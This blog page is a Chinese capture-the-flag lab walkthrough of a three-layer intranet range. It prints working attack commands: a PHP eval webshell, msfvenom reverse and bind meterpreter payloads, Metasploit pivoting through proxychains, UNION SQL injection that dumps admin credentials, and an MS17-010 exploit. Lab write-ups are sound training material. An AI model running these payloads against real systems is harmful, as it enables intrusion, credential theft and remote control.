
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
        <title>剣の魔王の小屋</title>
        <meta name="author" content="剣の魔王">
        <meta name="description" content="这个网站没有描述">
        <meta name="keywords" content="">
        <link rel="icon" href="image/head.png">
        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
        <script src="https://cdn.staticfile.org/font-awesome/6.2.0/js/all.min.js"></script>
        
        <link rel="stylesheet" href="/css/fonts.min.css">
        <link rel="stylesheet" href="/css/particlex.css">
        
        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
    <meta name="generator" content="Hexo 5.4.2"></head>
    <body>
        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:2147483647;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out;-webkit-user-select:none;-moz-user-select:none;user-select:none"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
        <div id="layout">
            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
            <transition name="into">
                <div v-show="show_page" style="display: -not-none">
                    <div id="menu_show">
                         
<nav id="menu">
    <div class="desktop-menu">
        <a href="/">
            <span class="title">剣の魔王の小屋</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;about</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;tags</span>
        </a>
        
    </div>
    <div :class="'phone-menu ' + menu_show" id="phone-menu">
        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
        <div :class="'title'" @click="menu_show = !menu_show">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;剣の魔王の小屋</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="menu_show">
            
            <a href="/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
                </div>
            </a>
            
            <a href="/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
                </div>
            </a>
            
            <a href="/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">archives</div>
                </div>
            </a>
            
            <a href="/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">categories</div>
                </div>
            </a>
            
            <a href="/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>
                    </div>
                    <div id="main">
                        
<div class="article">
    <div>
        <h1> </h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
            </span>
            2024/1/16
        </span>
        
        
    </div>
    <div class="content" v-pre>
        <h1 id="CFS-三层内网漫游安全测试演练-某-CTF-线下-2019"><a href="#CFS-三层内网漫游安全测试演练-某-CTF-线下-2019" class="headerlink" title="CFS 三层内网漫游安全测试演练-某 CTF 线下 2019"></a>CFS 三层内网漫游安全测试演练-某 CTF 线下 2019</h1><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/MCTSOG/article/details/124876557">第70天-内网安全-域横向内网漫游 Socks 代理隧道技_靶场(teamssix.com)-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=69&vd_source=748b50b4ab2ed6f717a4973de2dc03fb">第70天：内网安全-域横向内网漫游Socks代理隧道技术_哔哩哔哩_bilibili</a></p>
<h5 id="靶场下载："><a href="#靶场下载：" class="headerlink" title="靶场下载："></a>靶场下载：</h5><p>CFS三层靶机环境：<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1LJueA-X02K7HZXr8QsOmeg">https://pan.baidu.com/s/1LJueA-X02K7HZXr8QsOmeg</a><br>提取码: dkcp<br>解压密码：teamssix.com</p>
<p><strong><span id="more"></span></strong></p>
<p>网络拓扑图：</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-104231.png" alt="image-20240116104222440"></p>
<p>来源2019某CTF线下赛真题内网结合WEB攻防题库，涉及WEB攻击，内网代理路由等技术，每台服务器存在一个Flag,获取每一个Flag对应一个积分，获取三个Flag结尾。</p>
<h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>新建两个仅主机的虚拟网卡</p>
<p>VMnet2：子网ip：192.168.22.0    子网掩码：255.255.255.0</p>
<p>VMnet3：子网ip：192.168.33.0    子网掩码：255.255.255.0</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-104759.png" alt="image-20240116104758063"></p>
<h5 id="编辑虚拟机配置："><a href="#编辑虚拟机配置：" class="headerlink" title="编辑虚拟机配置："></a>编辑虚拟机配置：</h5><p>Target1：</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-104954.png" alt="image-20240116104953571"></p>
<p>target2：</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-105044.png" alt="image-20240116105043003"></p>
<p>target3：</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-105116.png" alt="image-20240116105115166"></p>
<h5 id="查看虚拟机ip："><a href="#查看虚拟机ip：" class="headerlink" title="查看虚拟机ip："></a>查看虚拟机ip：</h5><p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-105609.png" alt="image-20240116105608454"></p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-105658.png" alt="image-20240116105657377"></p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-105748.png" alt="image-20240116105747524"></p>
<h5 id="登录宝塔后台开启web服务："><a href="#登录宝塔后台开启web服务：" class="headerlink" title="登录宝塔后台开启web服务："></a>登录宝塔后台开启web服务：</h5><p>target1：</p>
<pre><code>http://192.168.145.147:8888/a768f109/
账号：eaj3yhsl，密码：41bb8fee
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-110431.png" alt="image-20240116110429813"></p>
<p>target2：</p>
<pre><code>http://192.168.22.128:8888/2cc52ec0
账号：xdynr37d，密码：123qwe..
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-110951.png" alt="image-20240116110949801"></p>
<h3 id="渗透攻击："><a href="#渗透攻击：" class="headerlink" title="渗透攻击："></a>渗透攻击：</h3><h4 id="Target1："><a href="#Target1：" class="headerlink" title="Target1："></a>Target1：</h4><p>首先对target1进行渗透，信息收集：</p>
<pre><code>nmap -sP 192.168.145.0/24      #扫描该网段的存活地址
</code></pre>
<p>存活的主机有192.168.145.2，这个是本机的；192.168.147，这是target1的；192.168.145.134是kali的</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-112349.png" alt="image-20240116112348607"></p>
<p>对192.168.145.147进行详细扫描</p>
<pre><code>nmap -O 192.168.145.147
</code></pre>
<p>可以看到开了80端口，系统为Linux，访问该ip的网站</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-112659.png" alt="image-20240116112658344"></p>
<p>网站为ThinkPHP V5开发的，在网上搜索对应漏洞，或者使用thinkPHP漏洞利用工具（通常需要配置一下java环境）</p>
<p>工具下载链接：<a target="_blank" rel="noopener" href="https://github.com/Lotus6/ThinkphpGUI/releases">Releases · Lotus6/ThinkphpGUI (github.com)</a></p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-112806.png" alt="image-20240116112805387"></p>
<p>检测到存在漏洞，我们利用其中一个漏洞得到shell</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-120637.png" alt="image-20240116120635722"></p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-120850.png" alt="image-20240116120849001"></p>
<p>通过命令写入一句话后门：</p>
<pre><code>echo &#39;&lt;?php @eval($_POST[x]);?&gt;&#39; &gt; /www/wwwroot/ThinkPHP/public/shell.php 
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-120957.png" alt="image-20240116120956251"></p>
<p>使用蚁剑连接上面的后门：</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-121133.png" alt="image-20240116121131834"></p>
<p>得到第一个flag：</p>
<pre><code>flag&#123;e2D3aFdasde&#125;
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-121408.png" alt="image-20240116121159878"></p>
<p>连接上去之后，可以用它当做跳板，但是蚁剑比较麻烦，此时可以改用CS神器或者MSF，因为使用CS或者MSF时，即使权限不够，我们也可以进行一些操作。</p>
<p>接下来我们开始渗透Target2。kali直接与target2连接是连不上的。因为kali网段是145，target2网段是22，二者不在同一个网段，无法互联，但是target1网段是80和22，target1既跟kali同一网段，又跟target2同一网段，因此，我们可以将target1作为跳板，实现kali和target2的互联。</p>
<h4 id="使用msf制作跳板"><a href="#使用msf制作跳板" class="headerlink" title="使用msf制作跳板"></a>使用msf制作跳板</h4><p>让kali虚拟机可以访问处于另一个网段的Target_2靶机</p>
<h5 id="kali上生成后门："><a href="#kali上生成后门：" class="headerlink" title="kali上生成后门："></a>kali上生成后门：</h5><pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.145.134 LPORT=1111 -f elf &gt;t1.elf
</code></pre>
<h5 id="接受反弹："><a href="#接受反弹：" class="headerlink" title="接受反弹："></a>接受反弹：</h5><pre><code>msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.145.134
set LPORT 1111
exploit
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-122710.png" alt="image-20240116122708679"></p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-122844.png" alt="image-20240116122842557"></p>
<p>上传t1.elf：</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-123017.png" alt="image-20240116123015899"></p>
<p>打开虚拟终端</p>
<pre><code>ipconfig        #先查看ip信息
chmod +x t1.elf        #给权限
./t1.elf
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-122934.png" alt="image-20240116122932864"></p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-123917.png" alt="image-20240116123915282"></p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-123145.png" alt="image-20240116123143571"></p>
<p>此时kali上已经看到会话</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-123225.png" alt="image-20240116123223177"></p>
<h4 id="继续信息收集："><a href="#继续信息收集：" class="headerlink" title="继续信息收集："></a>继续信息收集：</h4><pre><code>获取网络接口：run get_local_subnets
查看路由地址：run autoroute -p
添加路由地址：run autoroute -s 192.168.22.0/24
</code></pre>
<p>这里看到target1是有三个网口，一个是22是连接内网的网口，但是现在kali连接不了，因为kali是145网口的（122网口应该是前人添加的），此时就需要通过查看路由来看kali是否建立了22访问的路由，这里看到是未建立，就需要添加路由来访问22网段</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-124311.png" alt="image-20240116124309695"></p>
<p>但是添加了路由之后就存在一个问题，我们需要使用工具来攻击target2，而添加路由只能在msf会话上进行攻击，此时就需要开启本地代理，相当于给其他人（本机）一个接口来访问22网段</p>
<pre><code>开启本地代理：
use auxiliary/server/socks4a        #（msf5）
use auxiliary/server/socks_proxy    #（msf6）
set srvport 2222
exploit
</code></pre>
<h5 id="利用本地代理接口访问测试"><a href="#利用本地代理接口访问测试" class="headerlink" title="利用本地代理接口访问测试"></a>利用本地代理接口访问测试</h5><p>设置浏览器代理进行访问测试<br>linux:<br>配置proxychains后调用工具探针Target2</p>
<pre><code>/etc/proxychains.conf        #修改proxychains.conf文件
socks4 192.168.145.134 2222        #添加
proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80        #使用代理进行nmap扫描
-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。
-sT：扫描TcP数据包已建立的连接connect
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-130420.png" alt="image-20240116130418347"></p>
<p>可以看到已经有22网段访问的数据</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-131220.png" alt="image-20240116131218730"></p>
<p>不知道为什么80端口是关闭的</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-132449.png" alt="image-20240116132447546"></p>
<p>但是配置了浏览器代理了socks4之后是可以访问的</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-132906.png" alt="image-20240116132904932"></p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-132928.png" alt="image-20240116132926241"></p>
<p>由于是CTF比赛，所以查看一下网页源码吗，发现有提示</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-133100.png" alt="image-20240116133058219"></p>
<p>测试注入（手工或sqlmap）：</p>
<pre><code>http://192.168.22.128/index.php?r=vul&amp;keyword=1&#39; 20order by 39--+
http://192.168.22.128/index.php?r=vul&amp;keyword=1&#39; 20order by 40--+
查询版本：http://192.168.22.128/index.php?r=vul&amp;keyword=1&#39; union select version(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39 --+
查询表：192.168.22.128/index.php?r=vul&amp;keyword=1&#39; union select group_concat(table_name),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39  from  information_schema.tables where table_schema=&#39;bagecms&#39; --+
查询admin表下列名：192.168.22.128/index.php?r=vul&amp;keyword=1&#39; union select group_concat(column_name),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39 from information_schema.columns where table_name=&#39;bage_admin&#39; --+
查询admin表下的信息:192.168.22.128/index.php?r=vul&amp;keyword=1&#39; union select id,username,password,realname,group_id,email,qq,notebook,mobile,telephone,last_login_ip,login_count,status_is,create_time,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39 from bagecms.bage_admin --+
</code></pre>
<pre><code>数据库版本：version() --&gt;5.5.62-log

数据库名字：database() --&gt;bagecms

数据库用户：user() --&gt;bagecms@localhost

操作系统：@@version_compile_os  --&gt;Linux 
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-135410.png" alt="image-20240116135409130"></p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-135457.png" alt="image-20240116135455561"></p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-135902.png" alt="image-20240116135900758"></p>
<p>通过文件扫描可以得到robots.txt文件，可能是没配置好，使用第一条语句80端口拒绝访问，使用第二条却可以</p>
<pre><code>proxychains4 dirsearch -u http://192.168.22.128
dirsearch -u http://192.168.22.128
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-140606.png" alt="image-20240116140604875"></p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-140043.png" alt="image-20240116140042000"></p>
<p>访问<a target="_blank" rel="noopener" href="http://192.168.22.128/index.php?r=admini/public/login%EF%BC%8C%E9%80%9A%E8%BF%87%E4%B8%8A%E9%9D%A2%E5%BE%97%E5%88%B0%E7%9A%84%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0%EF%BC%8C%E5%9B%A0%E4%B8%BA%E5%88%9A%E6%89%8D%E5%BE%97%E5%88%B0%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%AFMD5%E5%8A%A0%E5%AF%86%E8%BF%87%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E9%9C%80%E8%A6%81%E8%A7%A3%E5%AF%86%E5%BE%97%E5%88%B0">http://192.168.22.128/index.php?r=admini/public/login，通过上面得到的密码登录后台，因为刚才得到的密码是MD5加密过的，所以需要解密得到</a></p>
<pre><code>账号：admin

密码：123qwe
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-140859.png" alt="image-20240116140857735"></p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-141033.png" alt="image-20240116141031906"></p>
<p>又得到一个flag</p>
<pre><code> flag&#123;eS3sd1IKarw&#125;
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-141100.png" alt="image-20240116141059116"></p>
<p>之后在模板里随便选择一个文件写入一句话后门，我选择special里的index.php文件</p>
<pre><code>&lt;?php @eval($_POST[x]);?&gt; 
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-143547.png" alt="image-20240116143545936"></p>
<p>由于它访问是有规则的，所以访问<a target="_blank" rel="noopener" href="http://192.168.22.128/index.php?r=special%E5%B0%B1%E7%9B%B8%E5%BD%93%E4%BA%8E%E8%AE%BF%E9%97%AEspecial%E9%87%8C%E7%9A%84index.php%EF%BC%8C%E4%BD%BF%E7%94%A8%E8%9A%81%E5%89%91%E9%87%8C%E7%9A%84%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5%EF%BC%8C%E5%BE%97%E5%88%B0webshell">http://192.168.22.128/index.php?r=special就相当于访问special里的index.php，使用蚁剑里的代理连接，得到webshell</a></p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-144113.png" alt="image-20240116144112232"></p>
<p>如果攻击机是windows的话，还可以利用代理工具Proxifier或SocksCap64载入代理进行远程访问测试。</p>
<p>接下来就要得到target2的会话：</p>
<p>由于target2的网段分别是22和33，而kali的网段是22和145，在生成反向连接后门时需要填写的连接攻击主机（kali）ip地址时就无法满足，因此需要生成正向后门。使用kali来正向连接target2，因为kali添加了路由，拥有22网段的路由，可以找到target2</p>
<h5 id="生成正向后门"><a href="#生成正向后门" class="headerlink" title="生成正向后门"></a>生成正向后门</h5><pre><code>msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; t2.elf
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-145334.png" alt="image-20240116145333568"></p>
<h5 id="接收反弹"><a href="#接收反弹" class="headerlink" title="接收反弹"></a>接收反弹</h5><pre><code>use exploit/multi/handler
set payload linux/x64/meterpreter/bind_tcp
set rhost 192.168.22.128
set LPORT 3333
exploit
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-145606.png" alt="image-20240116145604657"></p>
<pre><code>chmod +x t2.elf        #给权限
./t2.elf
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-145647.png" alt="image-20240116145645964"></p>
<p>kali接收到会话：</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-145714.png" alt="image-20240116145712558"></p>
<h5 id="继续信息收集"><a href="#继续信息收集" class="headerlink" title="继续信息收集"></a>继续信息收集</h5><pre><code>获取网络接口：run get_local_subnets
查看路由地址：run autoroute -p
添加路由地址：run autoroute -s 192.168.33.0/24
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-145944.png" alt="image-20240116145943244"></p>
<p>由于之前已经开了代理，这时在msf中添加路由，代理能到达33网段</p>
<p>通过nmap或者Nessus等工具探针目标，发现开放了445和3389端口，且存在MS17010漏洞。(永恒之蓝)</p>
<pre><code>proxychains4 nmap -Pn -sT 192.168.33.33
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-151716.png" alt="image-20240116151714884"></p>
<h5 id="利用MS17010获取系统权限"><a href="#利用MS17010获取系统权限" class="headerlink" title="利用MS17010获取系统权限"></a>利用MS17010获取系统权限</h5><pre><code>use exploit/windows/smb/ms17_010_psexec
set payload windows/meterpreter/bind_tcp 
set RHOST 192.168.33.33
exploit
</code></pre>
<p>得到system权限</p>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-151955.png" alt="image-20240116151953658"></p>
<pre><code>shell 
cd c:\
dir /S flag.txt /B 
type C:\Users\Administrator\Desktop\flag.txt
</code></pre>
<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240116-152245.png" alt="image-20240116152244398"></p>
<p>得到flag:</p>
<pre><code>flag&#123;2wAdK32Lsd&#125;
</code></pre>

    </div>
    
    
</div>
                         
<footer id="footer">
    <div class="footer-wrap">
        <div>
            © 2022 - 2024 剣の魔王の小屋
            <span class="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            @剣の魔王
        </div>
        <div></div>
        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
                target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a></div>
        
    </div>
</footer>
                    </div>
                </div>
            </transition>	
            <div id="img_show">
                <img id="img_content" alt="img_show">
            </div>
			<canvas
			id="fireworks"
			style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767">
			</canvas>
			<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
			<script src="/js/fireworks.min.js"></script>
        </div>
        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
        <script src="/js/particlex.js"></script>
        <script src="/js/showimg.js"></script>
        

    </body>
</html>